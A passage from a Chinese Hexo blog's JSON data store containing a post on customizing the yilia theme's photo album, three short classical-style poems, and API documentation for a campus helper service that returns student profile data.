起由\n从yilia作者[Litten的博客](http://litten.me/)看到了他的相册，蛮喜欢的，就想给自己也弄一个，于是找了到他的博客在github上边的备份下载了source/photos文件夹，但是没有get到作者的方法，只好稍作修改把照片放到本地实现了作者博客中的效果。\n<!--more-->\n### 改动\n1.由原作者图片托管在instagram改为托管在本地\n\n2.由原作者图片尺寸固定改为尺寸可以写入ins.json\n\n3.去掉原作者type选项，只可以放图片而不能放视频，并且图片格式只支持jpg（如果需要支持更多格式对ins.js稍作修改即可）\n\n4.link作为图片名\n\n5.去掉ins.jsn中的src选项\n\n### 预览\n\n点击左边的相册，或者[点此链接](https://blog.ctftools.com/photos)\n\n### 下载\n\n请移步github下载：[https://github.com/dr34-m/yilia-photos](https://github.com/dr34-m/yilia-photos)\n\n### 其他\n\n略缩图可下载这个软件批量生成\n\n链接: https://pan.baidu.com/s/1slULnUd 密码: 54je\n\n推荐略缩图尺寸328x328","source":"_posts/post235.md","raw":"---\ntitle: hexo-yilia主题相册\ndate: 2017-12-17 16:27:43\ntags: [编程,前端]\n---\n### 起由\n从yilia作者[Litten的博客](http://litten.me/)看到了他的相册，蛮喜欢的，就想给自己也弄一个，于是找了到他的博客在github上边的备份下载了source/photos文件夹，但是没有get到作者的方法，只好稍作修改把照片放到本地实现了作者博客中的效果。\n<!--more-->\n### 改动\n1.由原作者图片托管在instagram改为托管在本地\n\n2.由原作者图片尺寸固定改为尺寸可以写入ins.json\n\n3.去掉原作者type选项，只可以放图片而不能放视频，并且图片格式只支持jpg（如果需要支持更多格式对ins.js稍作修改即可）\n\n4.link作为图片名\n\n5.去掉ins.jsn中的src选项\n\n### 预览\n\n点击左边的相册，或者[点此链接](https://blog.ctftools.com/photos)\n\n### 下载\n\n请移步github下载：[https://github.com/dr34-m/yilia-photos](https://github.com/dr34-m/yilia-photos)\n\n### 其他\n\n略缩图可下载这个软件批量生成\n\n链接: https://pan.baidu.com/s/1slULnUd 密码: 54je\n\n推荐略缩图尺寸328x328","slug":"post235","published":1,"updated":"2020-12-07T02:07:29.872Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rdq0029q0szjtoomnyg","content":"<h3 id=\"起由\"><a href=\"#起由\" class=\"headerlink\" title=\"起由\"></a>起由</h3><p>从yilia作者<a href=\"http://litten.me/\" target=\"_blank\" rel=\"noopener\">Litten的博客</a>看到了他的相册，蛮喜欢的，就想给自己也弄一个，于是找了到他的博客在github上边的备份下载了source/photos文件夹，但是没有get到作者的方法，只好稍作修改把照片放到本地实现了作者博客中的效果。<br><a id=\"more\"></a></p>\n<h3 id=\"改动\"><a href=\"#改动\" class=\"headerlink\" title=\"改动\"></a>改动</h3><p>1.由原作者图片托管在instagram改为托管在本地</p>\n<p>2.由原作者图片尺寸固定改为尺寸可以写入ins.json</p>\n<p>3.去掉原作者type选项，只可以放图片而不能放视频，并且图片格式只支持jpg（如果需要支持更多格式对ins.js稍作修改即可）</p>\n<p>4.link作为图片名</p>\n<p>5.去掉ins.jsn中的src选项</p>\n<h3 id=\"预览\"><a href=\"#预览\" class=\"headerlink\" title=\"预览\"></a>预览</h3><p>点击左边的相册，或者<a href=\"https://blog.ctftools.com/photos\">点此链接</a></p>\n<h3 id=\"下载\"><a href=\"#下载\" class=\"headerlink\" title=\"下载\"></a>下载</h3><p>请移步github下载：<a href=\"https://github.com/dr34-m/yilia-photos\" target=\"_blank\" rel=\"noopener\">https://github.com/dr34-m/yilia-photos</a></p>\n<h3 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h3><p>略缩图可下载这个软件批量生成</p>\n<p>链接: <a href=\"https://pan.baidu.com/s/1slULnUd\" target=\"_blank\" rel=\"noopener\">https://pan.baidu.com/s/1slULnUd</a> 密码: 54je</p>\n<p>推荐略缩图尺寸328x328</p>\n","site":{"data":{}},"excerpt":"<h3 id=\"起由\"><a href=\"#起由\" class=\"headerlink\" title=\"起由\"></a>起由</h3><p>从yilia作者<a href=\"http://litten.me/\" target=\"_blank\" rel=\"noopener\">Litten的博客</a>看到了他的相册，蛮喜欢的，就想给自己也弄一个，于是找了到他的博客在github上边的备份下载了source/photos文件夹，但是没有get到作者的方法，只好稍作修改把照片放到本地实现了作者博客中的效果。<br>","more":"</p>\n<h3 id=\"改动\"><a href=\"#改动\" class=\"headerlink\" title=\"改动\"></a>改动</h3><p>1.由原作者图片托管在instagram改为托管在本地</p>\n<p>2.由原作者图片尺寸固定改为尺寸可以写入ins.json</p>\n<p>3.去掉原作者type选项，只可以放图片而不能放视频，并且图片格式只支持jpg（如果需要支持更多格式对ins.js稍作修改即可）</p>\n<p>4.link作为图片名</p>\n<p>5.去掉ins.jsn中的src选项</p>\n<h3 id=\"预览\"><a href=\"#预览\" class=\"headerlink\" title=\"预览\"></a>预览</h3><p>点击左边的相册，或者<a href=\"https://blog.ctftools.com/photos\">点此链接</a></p>\n<h3 id=\"下载\"><a href=\"#下载\" class=\"headerlink\" title=\"下载\"></a>下载</h3><p>请移步github下载：<a href=\"https://github.com/dr34-m/yilia-photos\" target=\"_blank\" rel=\"noopener\">https://github.com/dr34-m/yilia-photos</a></p>\n<h3 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h3><p>略缩图可下载这个软件批量生成</p>\n<p>链接: <a href=\"https://pan.baidu.com/s/1slULnUd\" target=\"_blank\" rel=\"noopener\">https://pan.baidu.com/s/1slULnUd</a> 密码: 54je</p>\n<p>推荐略缩图尺寸328x328</p>"},{"title":"危山","date":"2015-09-12T13:53:18.000Z","_content":"寂夜望危山，危山望不穿。\n孰怜危山前，孤鸿几盘旋。\n其目泪盈盈，其声戚惨惨。\n其心无人会，其念隔危山。","source":"_posts/post239.md","raw":"---\ntitle: 危山\ndate: 2015-09-12 21:53:18\ntags: 随笔\n---\n寂夜望危山，危山望不穿。\n孰怜危山前，孤鸿几盘旋。\n其目泪盈盈，其声戚惨惨。\n其心无人会，其念隔危山。","slug":"post239","published":1,"updated":"2020-10-28T10:22:47.338Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rdr002cq0sziljc3xeq","content":"<p>寂夜望危山，危山望不穿。<br>孰怜危山前，孤鸿几盘旋。<br>其目泪盈盈，其声戚惨惨。<br>其心无人会，其念隔危山。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>寂夜望危山，危山望不穿。<br>孰怜危山前，孤鸿几盘旋。<br>其目泪盈盈，其声戚惨惨。<br>其心无人会，其念隔危山。</p>\n"},{"title":"水调歌头","date":"2015-09-08T15:09:18.000Z","_content":"误被前缘误，痛被昔情痛。拟比名花，远胜月季牡丹红。残月窥人檐下，余晖隐洒案前，杯酒话心声。落花时节逢，安可赏孤鸿。\n烛偷瘦，夜渐深，梦不成。奇葩艳卉，深红浅白何足争。长夜思君难彻，光阴暗转乾坤，耳畔荡清风。当使伊人在，冯虚幽境中。","source":"_posts/post240.md","raw":"---\ntitle: 水调歌头\ndate: 2015-09-08 23:09:18\ntags: 随笔\n---\n误被前缘误，痛被昔情痛。拟比名花，远胜月季牡丹红。残月窥人檐下，余晖隐洒案前，杯酒话心声。落花时节逢，安可赏孤鸿。\n烛偷瘦，夜渐深，梦不成。奇葩艳卉，深红浅白何足争。长夜思君难彻，光阴暗转乾坤，耳畔荡清风。当使伊人在，冯虚幽境中。","slug":"post240","published":1,"updated":"2020-10-28T10:22:47.324Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rds002eq0sziripf8n8","content":"<p>误被前缘误，痛被昔情痛。拟比名花，远胜月季牡丹红。残月窥人檐下，余晖隐洒案前，杯酒话心声。落花时节逢，安可赏孤鸿。<br>烛偷瘦，夜渐深，梦不成。奇葩艳卉，深红浅白何足争。长夜思君难彻，光阴暗转乾坤，耳畔荡清风。当使伊人在，冯虚幽境中。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>误被前缘误，痛被昔情痛。拟比名花，远胜月季牡丹红。残月窥人檐下，余晖隐洒案前，杯酒话心声。落花时节逢，安可赏孤鸿。<br>烛偷瘦，夜渐深，梦不成。奇葩艳卉，深红浅白何足争。长夜思君难彻，光阴暗转乾坤，耳畔荡清风。当使伊人在，冯虚幽境中。</p>\n"},{"title":"水调歌头","date":"2015-09-04T14:16:18.000Z","_content":"暮雨何时尽，举酒问青天。不知今夕此刻，孰与我同酣。也欲觅君而去，又恐路途险远，跌落在云端。辗转复反侧，伊人闹心间。\n风凄凄，夜惨惨，君在安。不应长叹，何日与子共开颜。人云情深不寿，又曰慧极必伤，此事古难全。若使君心欢，吾宁肝肠断。","source":"_posts/post241.md","raw":"---\ntitle: 水调歌头\ndate: 2015-09-04 22:16:18\ntags: 随笔\n---\n暮雨何时尽，举酒问青天。不知今夕此刻，孰与我同酣。也欲觅君而去，又恐路途险远，跌落在云端。辗转复反侧，伊人闹心间。\n风凄凄，夜惨惨，君在安。不应长叹，何日与子共开颜。人云情深不寿，又曰慧极必伤，此事古难全。若使君心欢，吾宁肝肠断。","slug":"post241","published":1,"updated":"2020-10-28T10:22:47.325Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rdt002hq0szlvuhsvqn","content":"<p>暮雨何时尽，举酒问青天。不知今夕此刻，孰与我同酣。也欲觅君而去，又恐路途险远，跌落在云端。辗转复反侧，伊人闹心间。<br>风凄凄，夜惨惨，君在安。不应长叹，何日与子共开颜。人云情深不寿，又曰慧极必伤，此事古难全。若使君心欢，吾宁肝肠断。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>暮雨何时尽，举酒问青天。不知今夕此刻，孰与我同酣。也欲觅君而去，又恐路途险远，跌落在云端。辗转复反侧，伊人闹心间。<br>风凄凄，夜惨惨，君在安。不应长叹，何日与子共开颜。人云情深不寿，又曰慧极必伤，此事古难全。若使君心欢，吾宁肝肠断。</p>\n"},{"title":"海滨校园助手api使用文档","date":"2018-06-04T07:25:08.000Z","_content":"\n### 公共接口\n\n公共接口面向所有组织及个人开放，开发者可以凭借用户授权秘钥确认用户身份，以及获取用户姓名班级等信息。\n<!--more-->\n1.公共接口调用链接为：\n\n```\nhttps://hbscher.ctftools.com/pubapi?safekey=xxxxx\n```\n将其中的`xxxxx`改成对应的秘钥即可，授权秘钥只能使用一次，用完即失效\n\n2.返回数据样式：\n\n* 成功\n\n```js\n{\n    \"data\":[\n        {\n            \"id\":1,\t\t\t\t\t\t//用户在本平台的唯一身份码\n            \"uid\":16853046,\t\t\t\t\t//用户学号\n            \"uname\":\"王启航\",\t\t\t\t\t//用户姓名\n            \"grade\":\"16\",\t\t\t\t\t//用户年级\n            \"college\":\"计算机与信息技术学院\",\t\t\t//用户所在学院\n            \"speciality\":\"物联网\",\t\t\t\t//用户所在专业\n            \"clazz\":\"物联网1601\"\t\t\t\t\t//班级\n        }\n    ],\n    \"code\":200,\n    \"msg\":\"操作成功\"\n}\n```\n* 失败\n\n```js\n{\n    \"data\":null,\n    \"code\":500,\n    \"msg\":\"秘钥错误\"\n}\n```\n\n### 专用接口\n\n专用接口仅面向学校可信组织开放，开发者可以凭借学号、姓名、专业、班级这四个信息之一获取与之相关信息。\n\n1.专用接口调用链接为：\n\n```\nurl?token=专用秘钥&keytype=索引类型&keyword=索引数据\n```\n其中url与专用秘钥请联系admin@ctftools.com申请资格，索引类型分为四类，分别是bj(班级)、zy(专业)、uid(学号)、unme(姓名)，索引数据为索引类型对应的数据，例如以下示例：\n```\nurl?token=xxxx&keytype=bj&keyword=物联网1601\n\nurl?token=xxxx&keytype=uid&keyword=16853046\n```\n\n2.返回数据样式：\n\n* 单个\n\n```js\n{\n    \"data\":[\n        {\n            \"id\":1,\t\t\t\t\t\t//用户在本平台的唯一身份码\n            \"uid\":16853046,\t\t\t\t\t//用户学号\n            \"uname\":\"王启航\",\t\t\t\t\t//用户姓名\n            \"grade\":\"16\",\t\t\t\t\t//用户年级\n            \"college\":\"计算机与信息技术学院\",\t\t\t//用户所在学院\n            \"speciality\":\"物联网\",\t\t\t\t//用户所在专业\n            \"clazz\":\"物联网1601\"\t\t\t\t\t//班级\n        }\n    ],\n    \"code\":200,\n    \"msg\":\"操作成功\"\n}\n```\n\n* 多个\n\n```js\n{\n    \"data\":[\n        {\n            \"id\":1,\t\t\t\t\t\t//用户在本平台的唯一身份码\n            \"uid\":16853046,\t\t\t\t\t//用户学号\n            \"uname\":\"王启航\",\t\t\t\t\t//用户姓名\n            \"grade\":\"16\",\t\t\t\t\t//用户年级\n            \"college\":\"计算机与信息技术学院\",\t\t\t//用户所在学院\n            \"speciality\":\"物联网\",\t\t\t\t//用户所在专业\n            \"clazz\":\"物联网1601\"\t\t\t\t\t//班级\n        },\n        {\n            \"id\":1,\t\t\t\t\t\t//用户在本平台的唯一身份码\n            \"uid\":16853046,\t\t\t\t\t//用户学号\n            \"uname\":\"王启航\",\t\t\t\t\t//用户姓名\n            \"grade\":\"16\",\t\t\t\t\t//用户年级\n            \"college\":\"计算机与信息技术学院\",\t\t\t//用户所在学院\n            \"speciality\":\"物联网\",\t\t\t\t//用户所在专业\n            \"clazz\":\"物联网1601\"\t\t\t\t\t//班级\n        }\n    ],\n    \"code\":200,\n    \"msg\":\"操作成功\"\n}\n```\n\n问题与建议都可以联系：admin@ctftools.com","source":"_posts/post242.md","raw":"---\ntitle: 海滨校园助手api使用文档\ndate: 2018-06-04 15:25:08\ntags: [文档,编程]\n---\n\n### 公共接口\n\n公共接口面向所有组织及个人开放，开发者可以凭借用户授权秘钥确认用户身份，以及获取用户姓名班级等信息。\n<!--more-->\n1.公共接口调用链接为：\n\n```\nhttps://hbscher.ctftools.com/pubapi?safekey=xxxxx\n```\n将其中的`xxxxx`改成对应的秘钥即可，授权秘钥只能使用一次，用完即失效\n\n2.返回数据样式：\n\n* 成功\n\n```js\n{\n    \"data\":[\n        {\n            \"id\":1,\t\t\t\t\t\t//用户在本平台的唯一身份码\n            \"uid\":16853046,\t\t\t\t\t//用户学号\n            \"uname\":\"王启航\",\t\t\t\t\t//用户姓名\n            \"grade\":\"16\",\t\t\t\t\t//用户年级\n            \"college\":\"计算机与信息技术学院\",\t\t\t//用户所在学院\n            \"speciality\":\"物联网\",\t\t\t\t//用户所在专业\n            \"clazz\":\"物联网1601\"\t\t\t\t\t//班级\n        }\n    ],\n    \"code\":200,\n    \"msg\":\"操作成功\"\n}\n```\n* 失败\n\n```js\n{\n    \"data\":null,\n    \"code\":500,\n    \"msg\":\"秘钥错误\"\n}\n```\n\n### 专用接口\n\n专用接口仅面向学校可信组织开放，开发者可以凭借学号、姓名、专业、班级这四个信息之一获取与之相关信息。\n\n1.专用接口调用链接为：\n\n```\nurl?token=专用秘钥&keytype=索引类型&keyword=索引数据\n```\n其中url与专用秘钥请联系admin@ctftools.com申请资格，索引类型分为四类，分别是bj(班级)、zy(专业)、uid(学号)、unme(姓名)，索引数据为索引类型对应的数据，例如以下示例：\n```\nurl?token=xxxx&keytype=bj&keyword=物联网1601\n\nurl?token=xxxx&keytype=uid&keyword=16853046\n```\n\n2.返回数据样式：\n\n* 单个\n\n```js\n{\n    \"data\":[\n        {\n            \"id\":1,\t\t\t\t\t\t//用户在本平台的唯一身份码\n            \"uid\":16853046,\t\t\t\t\t//用户学号\n            \"uname\":\"王启航\",\t\t\t\t\t//用户姓名\n            \"grade\":\"16\",\t\t\t\t\t//用户年级\n            \"college\":\"计算机与信息技术学院\",\t\t\t//用户所在学院\n            \"speciality\":\"物联网\",\t\t\t\t//用户所在专业\n            \"clazz\":\"物联网1601\"\t\t\t\t\t//班级\n        }\n    ],\n    \"code\":200,\n    \"msg\":\"操作成功\"\n}\n```\n\n* 多个\n\n```js\n{\n    \"data\":[\n        {\n            \"id\":1,\t\t\t\t\t\t//用户在本平台的唯一身份码\n            \"uid\":16853046,\t\t\t\t\t//用户学号\n            \"uname\":\"王启航\",\t\t\t\t\t//用户姓名\n            \"grade\":\"16\",\t\t\t\t\t//用户年级\n            \"college\":\"计算机与信息技术学院\",\t\t\t//用户所在学院\n            \"speciality\":\"物联网\",\t\t\t\t//用户所在专业\n            \"clazz\":\"物联网1601\"\t\t\t\t\t//班级\n        },\n        {\n            \"id\":1,\t\t\t\t\t\t//用户在本平台的唯一身份码\n            \"uid\":16853046,\t\t\t\t\t//用户学号\n            \"uname\":\"王启航\",\t\t\t\t\t//用户姓名\n            \"grade\":\"16\",\t\t\t\t\t//用户年级\n            \"college\":\"计算机与信息技术学院\",\t\t\t//用户所在学院\n            \"speciality\":\"物联网\",\t\t\t\t//用户所在专业\n            \"clazz\":\"物联网1601\"\t\t\t\t\t//班级\n        }\n    ],\n    \"code\":200,\n    \"msg\":\"操作成功\"\n}\n```\n\n问题与建议都可以联系：admin@ctftools.com","slug":"post242","published":1,"updated":"2021-06-23T02:10:21.229Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rdu002jq0sz5l9ebw6h","content":"<h3 id=\"公共接口\"><a href=\"#公共接口\" class=\"headerlink\" title=\"公共接口\"></a>公共接口</h3><p>公共接口面向所有组织及个人开放，开发者可以凭借用户授权秘钥确认用户身份，以及获取用户姓名班级等信息。<br><a id=\"more\"></a><br>1.公共接口调用链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://hbscher.ctftools.com/pubapi?safekey=xxxxx</span><br></pre></td></tr></table></figure>\n<p>将其中的<code>xxxxx</code>改成对应的秘钥即可，授权秘钥只能使用一次，用完即失效</p>\n<p>2.返回数据样式：</p>\n<ul>\n<li>成功</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">\"data\"</span>:[</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"string\">\"id\"</span>:<span class=\"number\">1</span>,\t\t\t\t\t\t<span class=\"comment\">//用户在本平台的唯一身份码</span></span><br><span class=\"line\">            <span class=\"string\">\"uid\"</span>:<span class=\"number\">16853046</span>,\t\t\t\t\t<span class=\"comment\">//用户学号</span></span><br><span class=\"line\">            <span class=\"string\">\"uname\"</span>:<span class=\"string\">\"王启航\"</span>,\t\t\t\t\t<span class=\"comment\">//用户姓名</span></span><br><span class=\"line\">            <span class=\"string\">\"grade\"</span>:<span class=\"string\">\"16\"</span>,\t\t\t\t\t<span class=\"comment\">//用户年级</span></span><br><span class=\"line\">            <span class=\"string\">\"college\"</span>:<span class=\"string\">\"计算机与信息技术学院\"</span>,\t\t\t<span class=\"comment\">//用户所在学院</span></span><br><span class=\"line\">            <span class=\"string\">\"speciality\"</span>:<span class=\"string\">\"物联网\"</span>,\t\t\t\t<span class=\"comment\">//用户所在专业</span></span><br><span class=\"line\">            <span class=\"string\">\"clazz\"</span>:<span class=\"string\">\"物联网1601\"</span>\t\t\t\t\t<span class=\"comment\">//班级</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    ],</span><br><span class=\"line\">    <span class=\"string\">\"code\"</span>:<span class=\"number\">200</span>,</span><br><span class=\"line\">    <span class=\"string\">\"msg\"</span>:<span class=\"string\">\"操作成功\"</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>失败</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">\"data\"</span>:<span class=\"literal\">null</span>,</span><br><span class=\"line\">    <span class=\"string\">\"code\"</span>:<span class=\"number\">500</span>,</span><br><span class=\"line\">    <span class=\"string\">\"msg\"</span>:<span class=\"string\">\"秘钥错误\"</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"专用接口\"><a href=\"#专用接口\" class=\"headerlink\" title=\"专用接口\"></a>专用接口</h3><p>专用接口仅面向学校可信组织开放，开发者可以凭借学号、姓名、专业、班级这四个信息之一获取与之相关信息。</p>\n<p>1.专用接口调用链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">url?token=专用秘钥&amp;keytype=索引类型&amp;keyword=索引数据</span><br></pre></td></tr></table></figure>\n<p>其中url与专用秘钥请联系admin@ctftools.com申请资格，索引类型分为四类，分别是bj(班级)、zy(专业)、uid(学号)、unme(姓名)，索引数据为索引类型对应的数据，例如以下示例：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">url?token=xxxx&amp;keytype=bj&amp;keyword=物联网1601</span><br><span class=\"line\"></span><br><span class=\"line\">url?token=xxxx&amp;keytype=uid&amp;keyword=16853046</span><br></pre></td></tr></table></figure></p>\n<p>2.返回数据样式：</p>\n<ul>\n<li>单个</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">\"data\"</span>:[</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"string\">\"id\"</span>:<span class=\"number\">1</span>,\t\t\t\t\t\t<span class=\"comment\">//用户在本平台的唯一身份码</span></span><br><span class=\"line\">            <span class=\"string\">\"uid\"</span>:<span class=\"number\">16853046</span>,\t\t\t\t\t<span class=\"comment\">//用户学号</span></span><br><span class=\"line\">            <span class=\"string\">\"uname\"</span>:<span class=\"string\">\"王启航\"</span>,\t\t\t\t\t<span class=\"comment\">//用户姓名</span></span><br><span class=\"line\">            <span class=\"string\">\"grade\"</span>:<span class=\"string\">\"16\"</span>,\t\t\t\t\t<span class=\"comment\">//用户年级</span></span><br><span class=\"line\">            <span class=\"string\">\"college\"</span>:<span class=\"string\">\"计算机与信息技术学院\"</span>,\t\t\t<span class=\"comment\">//用户所在学院</span></span><br><span class=\"line\">            <span class=\"string\">\"speciality\"</span>:<span class=\"string\">\"物联网\"</span>,\t\t\t\t<span class=\"comment\">//用户所在专业</span></span><br><span class=\"line\">            <span class=\"string\">\"clazz\"</span>:<span class=\"string\">\"物联网1601\"</span>\t\t\t\t\t<span class=\"comment\">//班级</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    ],</span><br><span class=\"line\">    <span class=\"string\">\"code\"</span>:<span class=\"number\">200</span>,</span><br><span class=\"line\">    <span class=\"string\">\"msg\"</span>:<span class=\"string\">\"操作成功\"</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>多个</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">\"data\"</span>:[</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"string\">\"id\"</span>:<span class=\"number\">1</span>,\t\t\t\t\t\t<span class=\"comment\">//用户在本平台的唯一身份码</span></span><br><span class=\"line\">            <span class=\"string\">\"uid\"</span>:<span class=\"number\">16853046</span>,\t\t\t\t\t<span class=\"comment\">//用户学号</span></span><br><span class=\"line\">            <span class=\"string\">\"uname\"</span>:<span class=\"string\">\"王启航\"</span>,\t\t\t\t\t<span class=\"comment\">//用户姓名</span></span><br><span class=\"line\">            <span class=\"string\">\"grade\"</span>:<span class=\"string\">\"16\"</span>,\t\t\t\t\t<span class=\"comment\">//用户年级</span></span><br><span class=\"line\">            <span class=\"string\">\"college\"</span>:<span class=\"string\">\"计算机与信息技术学院\"</span>,\t\t\t<span class=\"comment\">//用户所在学院</span></span><br><span class=\"line\">            <span class=\"string\">\"speciality\"</span>:<span class=\"string\">\"物联网\"</span>,\t\t\t\t<span class=\"comment\">//用户所在专业</span></span><br><span class=\"line\">            <span class=\"string\">\"clazz\"</span>:<span class=\"string\">\"物联网1601\"</span>\t\t\t\t\t<span class=\"comment\">//班级</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"string\">\"id\"</span>:<span class=\"number\">1</span>,\t\t\t\t\t\t<span class=\"comment\">//用户在本平台的唯一身份码</span></span><br><span class=\"line\">            <span class=\"string\">\"uid\"</span>:<span class=\"number\">16853046</span>,\t\t\t\t\t<span class=\"comment\">//用户学号</span></span><br><span class=\"line\">            <span class=\"string\">\"uname\"</span>:<span class=\"string\">\"王启航\"</span>,\t\t\t\t\t<span class=\"comment\">//用户姓名</span></span><br><span class=\"line\">            <span class=\"string\">\"grade\"</span>:<span class=\"string\">\"16\"</span>,\t\t\t\t\t<span class=\"comment\">//用户年级</span></span><br><span class=\"line\">            <span class=\"string\">\"college\"</span>:<span class=\"string\">\"计算机与信息技术学院\"</span>,\t\t\t<span class=\"comment\">//用户所在学院</span></span><br><span class=\"line\">            <span class=\"string\">\"speciality\"</span>:<span class=\"string\">\"物联网\"</span>,\t\t\t\t<span class=\"comment\">//用户所在专业</span></span><br><span class=\"line\">            <span class=\"string\">\"clazz\"</span>:<span class=\"string\">\"物联网1601\"</span>\t\t\t\t\t<span class=\"comment\">//班级</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    ],</span><br><span class=\"line\">    <span class=\"string\">\"code\"</span>:<span class=\"number\">200</span>,</span><br><span class=\"line\">    <span class=\"string\">\"msg\"</span>:<span class=\"string\">\"操作成功\"</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>问题与建议都可以联系：admin@ctftools.com</p>\n","site":{"data":{}},"excerpt":"<h3 id=\"公共接口\"><a href=\"#公共接口\" class=\"headerlink\" title=\"公共接口\"></a>公共接口</h3><p>公共接口面向所有组织及个人开放，开发者可以凭借用户授权秘钥确认用户身份，以及获取用户姓名班级等信息。<br>","more":"<br>1.公共接口调用链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://hbscher.ctftools.com/pubapi?safekey=xxxxx</span><br></pre></td></tr></table></figure>\n<p>将其中的<code>xxxxx</code>改成对应的秘钥即可，授权秘钥只能使用一次，用完即失效</p>\n<p>2.返回数据样式：</p>\n<ul>\n<li>成功</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">\"data\"</span>:[</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"string\">\"id\"</span>:<span class=\"number\">1</span>,\t\t\t\t\t\t<span class=\"comment\">//用户在本平台的唯一身份码</span></span><br><span class=\"line\">            <span class=\"string\">\"uid\"</span>:<span class=\"number\">16853046</span>,\t\t\t\t\t<span class=\"comment\">//用户学号</span></span><br><span class=\"line\">            <span class=\"string\">\"uname\"</span>:<span class=\"string\">\"王启航\"</span>,\t\t\t\t\t<span class=\"comment\">//用户姓名</span></span><br><span class=\"line\">            <span class=\"string\">\"grade\"</span>:<span class=\"string\">\"16\"</span>,\t\t\t\t\t<span class=\"comment\">//用户年级</span></span><br><span class=\"line\">            <span class=\"string\">\"college\"</span>:<span class=\"string\">\"计算机与信息技术学院\"</span>,\t\t\t<span class=\"comment\">//用户所在学院</span></span><br><span class=\"line\">            <span class=\"string\">\"speciality\"</span>:<span class=\"string\">\"物联网\"</span>,\t\t\t\t<span class=\"comment\">//用户所在专业</span></span><br><span class=\"line\">            <span class=\"string\">\"clazz\"</span>:<span 